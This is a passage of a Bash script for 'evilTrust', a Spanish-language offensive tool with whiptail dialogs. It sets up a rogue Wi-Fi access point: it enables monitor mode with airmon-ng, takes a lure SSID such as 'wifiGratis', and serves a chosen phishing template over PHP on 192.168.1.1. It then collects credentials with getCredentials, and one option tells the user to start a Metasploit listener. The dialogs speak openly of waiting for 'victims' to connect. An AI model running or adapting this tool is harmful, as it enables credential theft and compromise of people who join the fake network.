...
function guiMode(){
	whiptail --title "evilTrust" --msgbox "Bienvenido a evilTrust, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
	whiptail --title "evilTrust" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
	...
	tput civis; dependencias=(php dnsmasq hostapd)
		...
		whiptail --title "evilTrust" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
		tput civis
        else
		whiptail --title "evilTrust" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
                exit 1
        fi
	...
	whiptail --title "evilTrust" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
	...
	tput civis; whiptail --title "evilTrust" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"

	rm iface 2>/dev/null
	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "evilTrust" 3>&1 1>&2 2>&3)
	whiptail --title "evilTrust" --checklist \
	...
	whiptail --title "evilTrust" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
	...
	whiptail --title "evilTrust" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78

        whiptail --title "evilTrust" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
	...
	template=$(cat template | tr -d '"'); rm template
        ...
        if [ $check_plantillas -eq 1 ]; then
		whiptail --title "evilTrust" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
		...
		whiptail --title "evilTrust" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                ...
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
		whiptail --title "evilTrust" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                popd > /dev/null 2>&1; getCredentials
	else
		whiptail --title "evilTrust" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
		template=$(whiptail --title "evilTrust" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "evilTrust - Plantilla personalizada" 3>&1 1>&2 2>&3)
                pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
